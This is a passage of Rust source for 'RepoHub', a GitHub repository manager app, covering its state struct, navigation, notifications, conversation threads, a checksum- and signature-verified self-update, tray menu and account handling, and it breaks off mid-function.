//! RepoHub: a personal GitHub repository manager built with Rune and rune-kit.
//!
//! It reads your repositories, pull requests, issues and workflow runs from the GitHub REST API.
//! The desktop app is configured by a `.env` file (see `.env.example`); the web build gets its
//! configuration and a token-adding proxy from `repohub-server` (the Docker image). Without either
//! it shows built-in sample data.
// Desktop-only helpers (local files, the terminal) aren't called from the web build.
#![cfg_attr(target_arch = "wasm32", allow(dead_code))]

use std::collections::HashMap;
use std::sync::Arc;

use rune::{AppHandle, Color, AppSpec, Cx, El, KeyEvent, ScrollSpec, TextEdit, Tx, col, row, text};
use rune_kit::shell::{self, PaneState, Sidebar, SidebarRow, SidebarSection, SidebarToggle, SplitView, Toolbar};
use rune_kit::{ControlSize, IconButton, IconButtonVariant, Kit, PaletteSeed};

mod actions;
mod board;
mod claude;
mod claude_page;
#[cfg(not(target_arch = "wasm32"))]
mod clones;
mod clones_shim;
mod config;
mod github;
mod harness;
mod icons;
mod inbox;
mod lists;
mod diffs;
mod filters;
mod local;
mod local_page;
mod changes_page;
mod markdown;
mod mobile;
mod model;
mod net;
mod notes;
mod notes_page;
mod pages;
mod palette;
#[cfg(not(target_arch = "wasm32"))]
mod plugins;
#[cfg(target_arch = "wasm32")]
#[path = "plugins_web.rs"]
mod plugins;
mod plugins_page;
mod prefs;
mod state;
mod terminal;
mod thread;
mod thread_page;
mod terminal_page;
mod themes;
mod themes_page;
mod tray;
mod ui;
mod update;

use config::Config;

/// Tests that change process environment variables hold this, so they don't race.
#[cfg(test)]
pub(crate) static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
use model::{Data, Detail, PullState, same_repo};

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Page {
    Overview,
    Repos,
    Repo(String),
    Pulls,
    Issues,
    Actions,
    /// What GitHub wants you to look at.
    Notifications,
    Settings,
    /// A plugin's page (its id).
    Plugin(String),
}

pub use state::Status;
use state::{BranchSlot, Compose, Load, OwnerFilter, Refresh, RepoFilter, RepoSort, RepoTab, Save, Submit, Theme, Toast, ToastKind};

pub struct App {
    sidebar: PaneState,
    page: Page,
    filter: RepoFilter,
    /// Whose repositories the Repositories page shows.
    owner: OwnerFilter,
    /// The repositories pinned in the app (full names); `None`: never changed, so
    /// `REPOHUB_PINNED` or the most recently pushed decide (see `pinned`).
    pins: Option<Vec<String>>,
    /// Where you were last time, waiting for the repositories to load (see `restore_place`).
    /// Navigating before then drops it: what you do now wins.
    pending_place: Option<state::Place>,
    /// Whether the current place may be saved: not before the saved one was restored.
    save_places: bool,
    /// The arrangement last saved, so it's written only when it changes.
    saved_layout: Option<state::Layout>,
    /// The Organizations section of the sidebar is collapsed.
    orgs_closed: bool,
    /// The section of the repository page. Change it with `set_tab`, which runs what a section
    /// needs on entry and tidies up the one it leaves.
    tab: RepoTab,
    /// The Pull requests page shows the pull requests in this state.
    pr_filter: PullState,
    search: TextEdit,
    theme: Theme,
    /// Installed plugins (desktop app).
    plugins: plugins::Plugins,
    /// The plugin whose section is open on the repository page (instead of `tab`).
    plugin_tab: Option<String>,
    /// Settings → Plugins: the folder or Git address to install from, and what went wrong.
    plugin_src: TextEdit,
    plugin_error: Option<String>,
    /// A plugin is being installed in the background.
    plugin_installing: bool,
    /// What a plugin asks to do outside the app, waiting for the user's answer.
    plugin_ask: Option<plugins::Request>,
    /// The plugin whose Remove was pressed once (press again to remove it).
    plugin_confirm: Option<String>,
    /// What the plugins' context was last built from (`plugins::context_key`).
    #[cfg_attr(target_arch = "wasm32", allow(dead_code))]
    plugin_ctx_key: u64,
    /// Whether the dark look is on screen (set while drawing; plugins' context).
    shown_dark: std::cell::Cell<bool>,
    /// The coding assistants (harnesses) and whether the Claude section is on.
    assist: harness::Assistants,
    /// The Settings form that adds a harness.
    harness_name: TextEdit,
    harness_cmd: TextEdit,
    harness_error: Option<String>,
    /// The looks (themes) and which one each appearance uses; edited in Settings.
    looks: themes::Looks,
    /// The theme editor's fields, for one of your looks.
    look_edit: LookEditor,
    /// The page area's size, for the background pattern.
    backdrop_size: [f32; 2],
    /// Decodes the background picture of a look (set up with the window).
    images: Option<rune::ImageCache>,
    sort: RepoSort,
    /// Counts toasts, so a toast's timer only hides its own message.
    toast_id: u64,
    pinned_open: bool,
    toast: Option<Toast>,
    cfg: Arc<Config>,
    data: Data,
    /// Local clones' file lists, by full name (desktop; read from disk).
    local: HashMap<String, Load<local::Tree>>,
    /// The Code tab's folder in the local clone (`""`: its root), and the file open in it.
    local_dir: String,
    local_file: Option<(String, Load<local::Content>)>,
    /// The diff on screen (local changes or a pull request's files) and what it is of.
    diff: rune_kit::diff::DiffState,
    diff_of: Option<diffs::DiffOf>,
    diff_load: Option<Load<()>>,
    /// The pull request diff on screen and what it is of: (repo full_name, pull number).
    pull_diff: rune_kit::diff::DiffState,
    pull_diff_of: Option<(String, u32)>,
    pull_diff_load: Option<Load<()>>,
    /// The local clone's branch, upstream and changes, for the Changes tab.
    changes: Option<local::Changes>,
    /// The Changes tab's commit message.
    commit_msg: TextEdit,
    /// A git command running in the background ("Committing…"), and the last one's error.
    git_job: Option<&'static str>,
    git_error: Option<String>,
    /// The branch being previewed for a local merge, and its commits.
    merge_preview: Option<local::MergePreview>,
    /// How a pull request is merged from its diff: merge, squash or rebase.
    merge_method: usize,
    /// The Code tab shows GitHub's files although a local clone is known.
    files_from_github: bool,
    /// Repository details by (full name, branch); a missing entry hasn't been asked for.
    details: HashMap<(String, String), Load<Detail>>,
    /// Where the data comes from. Change it with `set_status`.
    status: Status,
    /// Generation of the active account/session; incremented on account change or sign-out so
    /// in-flight background loads for an older account are dropped.
    load_gen: u64,
    handle: Option<AppHandle<App>>,
    // Notes (Excalidraw drawings), keyed by repository full name.
    branches: HashMap<String, Load<Vec<String>>>,
    /// The branch picked for each repository (Code and Notes tabs); absent: the default branch.
    branch_of: HashMap<String, String>,
    /// The open branch picker, and what it fills in.
    picker: Option<BranchSlot>,
    branch_filter: TextEdit,
    /// The open form (new issue, branch or pull request).
    form: Option<actions::Form>,
    /// The pull request whose Merge is waiting for a yes (`owner/repo#12`).
    confirm_merge: Option<String>,
    /// Your unread notifications; `None` until they're first asked for.
    inbox: Option<Load<Vec<inbox::Notification>>>,
    /// The notifications being marked as read.
    inbox_busy: std::collections::HashSet<String>,
    /// The Settings section on screen.
    settings_section: state::SettingsSection,
    /// The connection's details (environment variables, files) are shown in Settings.
    connection_details: bool,
    /// Issues being reopened with Undo, to put back in the list when GitHub confirms.
    reopening: Vec<model::Issue>,
    /// What the Pull requests and the Issues pages are narrowed to.
    pull_filter: filters::ListFilter,
    issue_filter: filters::ListFilter,
    /// The issue or pull request whose conversation is on screen, in place of the page.
    thread: Option<thread::Open>,
    /// Counts conversation loads (see [`thread::Open::epoch`]).
    thread_epoch: u64,
    /// Rows with a write running (`owner/repo#12`), so their buttons wait.
    busy: std::collections::HashSet<String>,
    /// The title (and draft flag) of the item a form is creating, for showing it once created.
    form_title: Option<String>,
    pull_meta: Option<(String, bool)>,
    notes: HashMap<(String, String), notes::NotesView>,
    note_name: TextEdit,
    confirm_delete: Option<String>,
    /// Generation of the open board load request; incremented on board open so late load results
    /// from an earlier board or earlier load cannot overwrite the open board.
    board_load_gen: u64,
    /// Drawings currently having a `notes::save` operation in-flight: `(repo, branch, name)`.
    saving_notes: HashMap<(String, String, String), NoteOp>,
    /// The note operations started, in order (tests check the write chain with it).
    #[cfg(test)]
    note_log: Vec<String>,
    /// Pending drawing save payloads waiting for an in-flight write to complete.
    pending_note_saves: HashMap<(String, String, String), NoteOp>,
    /// The drawing open in the Notes tab, if any.
    board: Option<board::Board>,
    // Claude tab (desktop): one conversation per repository, run in its local clone.
    chats: HashMap<String, claude::Chat>,
    claude_prompt: TextEdit,
    claude_mode: claude::Mode,
    // Terminal tab (desktop): one shell per repository, opened in its local clone.
    terms: HashMap<String, terminal::Term>,
    /// Width of one character and height of one line of the terminal font, measured on screen.
    term_cell: [f32; 2],
    /// Rows and columns the terminal area fits.
    term_grid: (u16, u16),
    clone_path: TextEdit,
    // The account form in Settings (desktop).
    acct_user: TextEdit,
    acct_token: TextEdit,
    acct_error: Option<String>,
    term_error: Option<String>,
    compact: bool,
    pub open_pulls_page: usize,
    pub closed_pulls_page: usize,
    pub issues_page: usize,
    pub loading_more_pulls: bool,
    pub loading_more_issues: bool,
    /// When GitHub's data on screen was loaded, and when the last load started (Unix seconds).
    loaded_at: Option<i64>,
    last_load: Option<i64>,
    /// The clock the "updated … ago" labels read; it ticks every 30 seconds.
    now: i64,
    /// Rune's frame clock (seconds since start; virtual in headless runs), when the last tick
    /// ran, and its value at the last load and the last data. It measures intervals with the
    /// wall clock above, which also counts time the computer slept.
    clock: f64,
    tick_at: f64,
    load_clock: Option<f64>,
    loaded_clock: Option<f64>,
    /// Updating the app itself (see `update`), whether its banner was put off, and Rune's clock
    /// at the last check.
    update: update::Update,
    #[cfg(not(target_arch = "wasm32"))]
    update_cancel: Option<UpdateJob>,
    update_later: bool,
    /// The update banner shows the new version's notes (What's new).
    show_notes: bool,
    update_checked: Option<f64>,
    /// The command palette, while it's open (⌘K / Ctrl+K).
    palette: Option<palette::Palette>,
    /// Seconds to back off until the next automatic refresh if rate limited.
    retry_after: Option<u64>,
    /// The status-bar widget, and the menu it shows now.
    #[cfg(not(target_arch = "wasm32"))]
    tray: Option<tray::Native>,
    tray_menu: Vec<tray::Entry>,
}

#[cfg(not(target_arch = "wasm32"))]
#[derive(Clone)]
struct UpdateJob {
    cancel: std::sync::Arc<std::sync::atomic::AtomicBool>,
    phase: std::sync::Arc<std::sync::atomic::AtomicU8>,
}

#[cfg(not(target_arch = "wasm32"))]
impl UpdateJob {
    const DOWNLOADING: u8 = 0;
    const CANCELLED: u8 = 1;
    const INSTALLING: u8 = 2;

    fn new() -> Self {
        use std::sync::{Arc, atomic::{AtomicBool, AtomicU8}};
        Self { cancel: Arc::new(AtomicBool::new(false)), phase: Arc::new(AtomicU8::new(Self::DOWNLOADING)) }
    }

    fn try_cancel(&self) -> bool {
        use std::sync::atomic::Ordering;
        if self.phase.compare_exchange(Self::DOWNLOADING, Self::CANCELLED, Ordering::SeqCst, Ordering::SeqCst).is_ok() {
            self.cancel.store(true, Ordering::SeqCst);
            true
        } else {
            false
        }
    }

    fn begin_install(&self) -> bool {
        use std::sync::atomic::Ordering;
        self.phase.compare_exchange(Self::DOWNLOADING, Self::INSTALLING, Ordering::SeqCst, Ordering::SeqCst).is_ok()
    }

    fn was_cancelled(&self) -> bool {
        self.cancel.load(std::sync::atomic::Ordering::SeqCst)
    }
}

impl App {
    /// The index into `data.repos` of the repository currently open, if any.
    pub fn repo_index(&self) -> Option<usize> {
        match &self.page {
            Page::Repo(full) => self.repo_index_of(full),
            _ => None,
        }
    }

    /// Finds a repository's index by its full name (case-insensitive).
    pub fn repo_index_of(&self, full: &str) -> Option<usize> {
        self.data.repos.iter().position(|r| r.full_name.eq_ignore_ascii_case(full))
    }

    /// Opens a page. Leaving a repository's section closes what belonged to it.
    fn go(&mut self, p: Page) {
        // Moving before the saved place was restored: you chose where to be.
        if self.pending_place.take().is_some() {
            self.save_places = true;
        }
        if self.page != p {
            state::trace("page", &self.page, &p);
            self.close_pull_diff();
            self.leave_tab();
        }
        self.page = p;
        self.thread = None;
        if self.page == Page::Notifications {
            self.load_inbox();
        }
        self.toast = None;
        self.sync_tray();
        self.save_place();
    }

    /// The place on screen, for the next start.
    fn place(&self) -> state::Place {
        let (page, repo) = match &self.page {
            Page::Overview => ("overview", None),
            Page::Repos => ("repos", None),
            Page::Repo(full) => ("repo", Some(full.clone())),
            Page::Pulls => ("pulls", None),
            Page::Issues => ("issues", None),
            Page::Actions => ("actions", None),
            Page::Notifications => ("notifications", None),
            Page::Settings => ("settings", None),
            Page::Plugin(_) => ("overview", None),
        };
        state::Place { page: page.into(), tab: repo.as_ref().map(|_| self.tab), repo }
    }

    fn save_place(&mut self) {
        if self.save_places && !self.data.sample_or_empty() {
            prefs::set("place", self.place().to_json());
        }
        self.save_layout();
    }

    /// The sidebar and the list's sort and owner, saved when they changed.
    fn save_layout(&mut self) {
        let now = state::Layout { sidebar_width: self.sidebar.width(), sidebar_open: self.sidebar.is_open(), sort: self.sort, owner: self.owner.clone() };
        if self.saved_layout.as_ref() != Some(&now) {
            prefs::set("layout", now.to_json());
            self.saved_layout = Some(now);
        }
    }

    /// Opens the place saved last time, once the repositories are here. A repository that's
    /// gone falls back to the Repositories page.
    fn restore_place(&mut self) {
        let Some(p) = self.pending_place.take() else { return };
        self.save_places = true;
        state::trace("restore", &"place", &p);
        let page = match p.page.as_str() {
            "repos" => Page::Repos,
            "pulls" => Page::Pulls,
            "issues" => Page::Issues,
            "actions" => Page::Actions,
            "notifications" => Page::Notifications,
            "settings" => Page::Settings,
            "repo" => match p.repo.as_ref().and_then(|full| self.data.repos.iter().position(|r| r.full_name.eq_ignore_ascii_case(full))) {
                Some(i) => {
                    self.open(i);
                    if let Some(t) = p.tab {
                        self.set_tab(i, t);
                    }
                    return;
                }
                None => Page::Repos,
            },
            _ => Page::Overview,
        };
        self.go(page);
    }

    /// Tidies up the repository section on screen before another one (or another page) shows:
    /// the open drawing is closed (its last edits are written first), and pending confirmations
    /// and error messages don't follow you to the next place.
    fn leave_tab(&mut self) {
        self.flush_board();
        self.board = None;
        self.confirm_delete = None;
        self.term_error = None;
        self.picker = None;
        self.confirm_merge = None;
        self.thread = None;
        self.close_pull_diff();
    }

    /// How many unread notifications are loaded.
    fn unread(&self) -> usize {
        self.inbox.as_ref().and_then(Load::ready).map_or(0, Vec::len)
    }

    /// Reads the unread notifications from GitHub (again). The list on screen stays meanwhile.
    pub(crate) fn load_inbox(&mut self) {
        if self.data.sample || !self.cfg.live() || self.cfg.token.is_none() {
            return;
        }
        let Some(h) = self.handle.clone() else { return };
        if !matches!(self.inbox, Some(Load::Ready(_))) {
            self.inbox = Some(Load::Loading);
        }
        let cfg = self.cfg.clone();
        let account = self.load_gen;
        net::spawn(h, move || async move { github::load_notifications(&cfg).await }, move |s: &mut App, r| {
            if s.load_gen != account {
                return;
            }
            s.inbox = Some(match r {
                Ok(list) => Load::Ready(list),
                Err(e) => Load::Failed(inbox::explain(&e)),
            });
            s.sync_tray();
        });
    }

    /// Marks notification `id` as read: it leaves the list at once, and comes back if GitHub
    /// refuses.
    pub(crate) fn mark_read(&mut self, id: &str) {
        let Some(h) = self.handle.clone() else { return };
        let Some(Load::Ready(list)) = self.inbox.as_mut() else { return };
        let Some(at) = list.iter().position(|n| n.id == id) else { return };
        if !self.inbox_busy.insert(id.to_owned()) {
            return;
        }
        let taken = list.remove(at);
        let cfg = self.cfg.clone();
        let account = self.load_gen;
        let id = id.to_owned();
        net::spawn(h, { let id = id.clone(); move || async move { github::mark_read(&cfg, &id).await } }, move |s: &mut App, r: Result<(), String>| {
            if s.load_gen != account {
                return;
            }
            s.inbox_busy.remove(&id);
            if let Err(e) = r {
                if let Some(Load::Ready(list)) = s.inbox.as_mut() {
                    list.insert(at.min(list.len()), taken);
                }
                s.notify_problem(inbox::explain(&e));
            }
            s.sync_tray();
        });
    }

    /// Opens what a notification is about (its conversation, or its page on GitHub) and marks
    /// it as read.
    pub(crate) fn open_notification(&mut self, n: &inbox::Notification, tx: &mut Tx) {
        match (n.subject, n.number) {
            (inbox::Subject::Issue, Some(number)) => self.open_thread(&n.repo, number, false),
            (inbox::Subject::Pull, Some(number)) => self.open_thread(&n.repo, number, true),
            _ => {
                let _ = tx.open_url(&n.url);
            }
        }
        self.mark_read(&n.id);
    }

    /// Opens the conversation of issue or pull request `number` of `repo`, in place of the page.
    pub(crate) fn open_thread(&mut self, repo: &str, number: u32, pull: bool) {
        self.close_pull_diff();
        self.confirm_merge = None;
        self.thread_epoch = self.thread_epoch.wrapping_add(1);
        self.thread = Some(thread::Open { repo: repo.to_owned(), number, pull, load: Load::Loading, reply: TextEdit::new(""), sending: false, epoch: self.thread_epoch });
        self.load_thread();
    }

    /// Reads the open conversation from GitHub (again). What's on screen stays until the answer.
    pub(crate) fn load_thread(&mut self) {
        let Some(t) = self.thread.as_mut() else { return };
        let (repo, number, pull, epoch) = (t.repo.clone(), t.number, t.pull, t.epoch);
        // The sample data has no GitHub behind it: a made-up conversation shows the page.
        if self.data.sample {
            let (title, author, standing) = if pull {
                self.data.pulls.iter().find(|p| p.number == number && same_repo(&p.repo, &repo))
                    .map(|p| (p.title.clone(), p.author.clone(), match p.state {
                        PullState::Open => thread::Standing::Open,
                        PullState::Draft => thread::Standing::Draft,
                        PullState::Merged => thread::Standing::Merged,
                        PullState::Closed => thread::Standing::Closed,
                    }))
            } else {
                self.data.issues.iter().find(|x| x.number == number && same_repo(&x.repo, &repo))
                    .map(|x| (x.title.clone(), self.data.profile.login.clone(), thread::Standing::Open))
            }.unwrap_or_else(|| (format!("#{number}"), self.data.profile.login.clone(), thread::Standing::Open));
            t.load = Load::Ready(thread::sample(&title, &author, pull, standing, self.now));
            return;
        }
        let Some(h) = self.handle.clone() else {
            t.load = Load::Failed("The app isn't ready to load this yet: try again in a moment.".into());
            return;
        };
        if !matches!(t.load, Load::Ready(_)) {
            t.load = Load::Loading;
        }
        let cfg = self.cfg.clone();
        let account = self.load_gen;
        let full = self.data.repos.iter().find(|r| same_repo(&r.full_name, &repo)).map(|r| r.full_name.clone()).unwrap_or_else(|| repo.clone());
        net::spawn(h, move || async move { github::load_thread(&cfg, &full, number).await }, move |s: &mut App, r| {
            // Another account, another conversation, or this one closed meanwhile: not ours.
            if s.load_gen != account {
                return;
            }
            let Some(t) = s.thread.as_mut().filter(|t| t.epoch == epoch) else { return };
            t.load = match r {
                Ok(thread) => Load::Ready(thread),
                // A reload that fails keeps what was read before, and says so.
                Err(e) if matches!(t.load, Load::Ready(_)) => {
                    s.notify_problem(e);
                    return;
                }
                Err(e) => Load::Failed(e),
            };
        });
    }

    /// Sends what's typed in the conversation's box: a comment, or a review with `verdict`.
    pub(crate) fn send_reply(&mut self, verdict: Option<thread::Verdict>) {
        let Some(t) = self.thread.as_mut() else { return };
        if t.sending {
            return;
        }
        let body = t.reply.text.trim().to_owned();
        // Only an approval can go without words.
        if body.is_empty() && verdict != Some(thread::Verdict::Approved) {
            return;
        }
        let (repo, number) = (t.repo.clone(), t.number);
        let w = match verdict {
            Some(verdict) => github::Write::Review { number, verdict, body },
            None => github::Write::Comment { number, body },
        };
        if actions::blocked(self).is_none() {
            if let Some(t) = self.thread.as_mut() {
                t.sending = true;
            }
            self.write(&repo, w);
        }
    }

    /// Switches the repository page of repository `i` to `tab`.
    /// The sections a repository's page shows, in order: Claude only while it's on.
    fn tabs(&self) -> Vec<RepoTab> {
        let local = match &self.page {
            Page::Repo(full) => self.local.contains_key(full),
            _ => false,
        };
        RepoTab::ALL.into_iter().filter(|t| (*t != RepoTab::Claude || self.assist.claude) && (*t != RepoTab::Changes || local)).collect()
    }

    fn set_tab(&mut self, i: usize, tab: RepoTab) {
        self.plugin_tab = None;
        let tab = if self.tabs().contains(&tab) { tab } else { RepoTab::Code };
        if self.tab != tab {
            state::trace("tab", &self.tab, &tab);
            self.leave_tab();
        }
        self.tab = tab;
        self.save_place();
        match tab {
            RepoTab::Notes => self.load_notes(i),
            RepoTab::Terminal => self.open_terminal(i),
            RepoTab::Changes => self.load_changes(i),
            _ => {}
        }
    }

    fn set_status(&mut self, status: Status) {
        if self.status != status {
            state::trace("status", &self.status.name(), &status.name());
        }
        self.status = status;
        self.sync_tray();
    }

    /// Seconds since `wall` (Unix seconds) and `mono` (frame clock), whichever measured more.
    fn since(&self, wall: Option<i64>, mono: Option<f64>) -> Option<i64> {
        let w = wall.map(|t| self.now - t);
        let m = mono.map(|c| (self.clock - c) as i64);
        w.max(m).map(|d| d.max(0))
    }

    /// "Updated 3 minutes ago", once GitHub's data has loaded.
    fn freshness(&self) -> Option<String> {
        let age = self.since(self.loaded_at, self.loaded_clock)?;
        Some(format!("Updated {}", model::ago(self.now - age, self.now)))
    }

    /// Seconds until the next automatic refresh (negative: overdue), if they're on. The
    /// interval counts from when the last load started, so a failed load waits a whole one.
    fn refresh_in(&self) -> Option<i64> {
        let every = self.cfg.refresh_every()? as i64 * 60;
        let interval = match self.retry_after.or(self.data.retry_after) {
            Some(ra) => every.max(ra as i64),
            None => every,
        };
        let since = self.since(self.last_load.or(self.loaded_at), self.load_clock.or(self.loaded_clock))?;
        Some(interval - since)
    }

    /// Every 30 seconds: move the labels' clock, and refresh when it's due. A load already
    /// running, the sample data, or a refresh turned off skip it.
    fn tick(&mut self) {
        self.now = net::now();
        if self.refresh_in().is_some_and(|left| left <= 0) && self.status.can_load() {
            state::trace("refresh", &"due", &self.cfg.refresh_every());
            self.refresh();
        }
        self.save_layout();
        // A new Latest build is looked for every 6 hours, unless one is already waiting.
        if self.update.available().is_none() && self.update_checked.is_some_and(|c| self.clock - c >= 6.0 * 3600.0) {
            self.check_update(false);
        }
        self.sync_tray();
    }

    /// Asks GitHub for the Latest build. `asked`: the user pressed Check, so say the outcome.
    fn check_update(&mut self, asked: bool) {
        #[cfg(not(target_arch = "wasm32"))]
        {
            let Some(h) = self.handle.clone() else { return };
            let Some(prior) = self.update.start_check(asked) else { return };
            self.update_checked = Some(self.clock);
            net::spawn(h, || async { update::check() }, move |s: &mut App, r| {
                s.apply_update_check(prior, asked, r);
            });
        }
        #[cfg(target_arch = "wasm32")]
        let _ = asked;
    }

    #[cfg(not(target_arch = "wasm32"))]
    fn apply_update_check(&mut self, prior: Option<update::Release>, asked: bool, r: Result<update::Release, String>) {
        let outcome = match r {
            Ok(rel) if update::build().is_some_and(|b| update::is_newer(&rel, b, update::built_at())) => {
                if asked {
                    self.notify(format!("A new version is ready ({})", rel.short()));
                }
                Ok(Some(rel))
            }
            Ok(_) => {
                if asked {
                    self.notify("RepoHub is up to date");
                }
                Ok(None)
            }
            Err(e) => {
                if asked {
                    self.notify_problem(e.clone());
                }
                Err(e)
            }
        };
        self.update.finish_check(prior, outcome);
        self.sync_tray();
    }

    /// Downloads the new version, checks it, puts it in place and restarts into it.
    fn install_update(&mut self) {
        #[cfg(not(target_arch = "wasm32"))]
        {
            let Some(rel) = self.update.available().cloned() else { return };
            let Some(h) = self.handle.clone() else { return };
            let job = UpdateJob::new();
            self.update_cancel = Some(job.clone());
            self.update = update::Update::Downloading { release: rel.clone(), percent: 0 };
            self.sync_tray();
            let progress = h.clone();
            let progress_job = job.clone();
            let done_job = job.clone();
            net::spawn(h, move || async move {
                let bytes = update::download(&rel.url, rel.size, &job.cancel, |pct| {
                    let pj = progress_job.clone();
                    progress.update(move |s: &mut App, _| {
                        if !pj.was_cancelled()
                            && let update::Update::Downloading { percent, .. } = &mut s.update
                        {
                            *percent = pct;
                        }
                    });
                })?;
                let sums = rel.sums.as_deref().ok_or("This build has no checksums (SHA256SUMS), so it isn't installed. Download it from the Releases page.")?;
                let sums = String::from_utf8_lossy(&update::download(sums, 0, &job.cancel, |_| {})?).into_owned();
                if !job.begin_install() {
                    return Err("Download cancelled.".into());
                }
                progress.update(move |s: &mut App, _| {
                    s.update_cancel = None;
                    if matches!(s.update, update::Update::Downloading { .. }) {
                        s.update = update::Update::Installing;
                        s.sync_tray();
                    }
                });
                // Who made this release (the signature), then that the package is the one it lists.
                let signature = match (update::signing_key(), rel.sig.as_deref()) {
                    (Some(_), Some(url)) => Some(String::from_utf8_lossy(&update::download(url, 0, &job.cancel, |_| {})?).into_owned()),
                    _ => None,
                };
                update::verify_signature(&sums, signature.as_deref(), update::signing_key())?;
                update::verify(&bytes, &rel.asset, &sums)?;
                let exe = std::env::current_exe().map_err(|e| e.to_string())?;
                let target = update::install(&bytes, &rel.asset, &exe)?;
                update::relaunch(&target)
            }, move |s: &mut App, r: Result<(), String>| {
                if done_job.was_cancelled() {
                    return;
                }
                s.update_cancel = None;
                match r {
                    Ok(()) => {
                        s.update = update::Update::Installing;
                        if let Some(h) = &s.handle {
                            h.quit();
                        }
                    }
                    Err(e) => {
                        s.notify_problem(e.clone());
                        s.update = update::Update::Failed(e);
                    }
                }
                s.sync_tray();
            });
        }
    }

    /// Stops an in-progress update download and restores the ready update.
    fn cancel_update(&mut self) {
        if !matches!(self.update, update::Update::Downloading { .. }) {
            return;
        }
        #[cfg(not(target_arch = "wasm32"))]
        if let Some(job) = self.update_cancel.take()
            && !job.try_cancel()
        {
            self.update = update::Update::Installing;
            self.sync_tray();
            return;
        }
        if let update::Update::Downloading { release, .. } = &self.update {
            self.update = update::Update::Available(release.clone());
            self.sync_tray();
        }
    }

    /// Shows the status-bar widget (desktop windows; see `tray`).
    fn start_tray(&mut self) {
        #[cfg(not(target_arch = "wasm32"))]
        {
            if !tray::wanted() || self.tray.is_some() {
                return;
            }
            let Some(h) = self.handle.clone() else { return };
            let entries = tray::menu(self);
            match tray::create(h, &entries, &tray::tooltip(self)) {
                Ok(t) => {
                    self.tray = Some(t);
                    self.tray_menu = entries;
                }
                Err(e) => eprintln!("repohub: no status-bar icon: {e}"),
            }
        }
    }

    /// Pushes the widget's menu again when what it shows changed.
    fn sync_tray(&mut self) {
        #[cfg(not(target_arch = "wasm32"))]
        if self.tray.is_some() {
            let entries = tray::menu(self);
            if entries != self.tray_menu {
                if let Some(t) = &self.tray {
                    t.update(&entries, &tray::tooltip(self));
                }
                self.tray_menu = entries;
            }
        }
    }

    /// A pick from the widget's menu (or a click on its icon: `open`).
    fn tray_action(&mut self, id: &str) {
        let Some(action) = tray::parse(id) else { return };
        let repo = |s: &App, full: &str| s.data.repos.iter().position(|r| r.full_name.eq_ignore_ascii_case(full));
        let show = !matches!(action, tray::Action::Refresh | tray::Action::Quit);
        match action {
            tray::Action::Open => {}
            tray::Action::Go(p) => self.go(p),
            tray::Action::OpenRepo(full) => if let Some(i) = repo(self, &full) { self.open(i) },
            tray::Action::NewIssue(full) => if let Some(i) = repo(self, &full) {
                if !matches!(&self.page, Page::Repo(f) if f.eq_ignore_ascii_case(&full)) {
                    self.open(i);
                }
                self.open_form(i, Compose::Issue);
            },
            tray::Action::Refresh => self.refresh(),
            tray::Action::Update => self.install_update(),
            tray::Action::Quit => if let Some(h) = &self.handle { h.quit() },
        }
        if show && let Some(h) = &self.handle {
            h.open();
        }
    }

    /// Picks the board's colour, and recolours the selection too, as Excalidraw does.
    fn pick_board_color(&mut self, ci: usize) {
        let Some(b) = self.board.as_mut().filter(|b| b.save != Save::Loading) else { return };
        b.color = ci;
        if let Some(e) = b.selected.and_then(|i| b.elements.get_mut(i)) {
            e.stroke = board::STROKES[ci].to_owned();
            if e.fill.is_some() {
                e.fill = Some(board::FILLS[ci].to_owned());
            }
            self.save_board();
        }
    }

    /// True when the board editor is on screen (and so takes its keyboard shortcuts).
    fn editing_board(&self) -> bool {
        self.board.is_some() && self.tab == RepoTab::Notes && matches!(self.page, Page::Repo(_))
    }

    /// Who owns the account setting: the environment, nobody yet, or the form in Settings.
    fn account(&self) -> state::Account {
        if self.cfg.account_locked {
            state::Account::Locked
        } else if self.cfg.live() {
            state::Account::SignedIn
        } else {
            state::Account::SignedOut
        }
    }

    /// Drops in-flight GitHub loads from the previous account and clears per-account caches,
    /// forms, filters and saved place, while keeping local clone sessions (terminals and Claude
    /// chats).
    #[cfg_attr(target_arch = "wasm32", allow(dead_code))]
    fn reset_account_state(&mut self) {
        self.load_gen = self.load_gen.wrapping_add(1);
        self.board_load_gen = self.board_load_gen.wrapping_add(1);
        // Drawings are files on this computer (or the server's notes folder), not account data:
        // writes in flight and queued ones still finish, so no edit is lost on an account switch.
        self.leave_tab();
        self.inbox = None;
        self.inbox_busy.clear();
        // Another account has other repositories and labels.
        self.pull_filter.clear();
        self.issue_filter.clear();
        self.data = Data::default();
        self.tab = RepoTab::Code;
        self.plugin_tab = None;
        self.pending_place = None;
        self.save_places = true;
        self.filter = RepoFilter::All;
        self.owner = OwnerFilter::All;
        self.pr_filter = PullState::Open;
        self.search.clear();
        self.branch_filter.clear();
        self.details.clear();
        self.branches.clear();
        self.branch_of.clear();
        self.local.clear();
        self.local_dir.clear();
        self.local_file = None;
        self.files_from_github = false;
        self.notes.clear();
        self.note_name.clear();
        self.form = None;
        self.form_title = None;
        self.pull_meta = None;
        self.busy.clear();
        self.diff.set_files(Vec::new());
        self.diff_of = None;
        self.diff_load = None;
        self.close_pull_diff();
        self.changes = None;
        self.commit_msg.clear();
        self.git_error = None;
        self.merge_preview = None;
        self.claude_prompt.clear();
        self.clone_path.clear();
        self.loaded_at = None;
        self.last_load = None;
        self.load_clock = None;
        self.loaded_clock = None;
        self.open_pulls_page = 1;
        self.closed_pulls_page = 1;
        self.issues_page = 1;
        self.loading_more_pulls = false;
        self.loading_more_issues = false;
        // `self.data` is now empty, so `go()` -> `save_place()` skips writing `"place"`.
        prefs::set("place", state::Place { page: "overview".into(), tab: None, repo: None }.to_json());
        self.go(Page::Overview);
    }

    /// Saves the account typed in Settings and loads its data. An empty token field keeps the
    /// saved token; `sign_out` removes both.
    #[cfg(not(target_arch = "wasm32"))]
    fn save_account(&mut self, sign_out: bool) {
        let user = self.acct_user.text.trim().trim_start_matches('@').to_owned();
        let typed = self.acct_token.text.trim().to_owned();
        let (user, token) = if sign_out {
            (None, None)
        } else {
            (Some(user).filter(|u| !u.is_empty()), Some(typed).filter(|t| !t.is_empty()).or_else(|| self.cfg.token.clone()))
        };
        if !sign_out && user.is_none() && token.is_none() {
            self.acct_error = Some("Type your GitHub user name, a token, or both.".into());
            return;
        }
        if let Err(e) = config::save_account(user.as_deref(), token.as_deref()) {
            self.acct_error = Some(e);
            return;
        }
        // Ensure neither GITHUB_TOKEN nor GITHUB_USER lingers in the process environment.
        unsafe {
            std::env::remove_var("GITHUB_TOKEN");
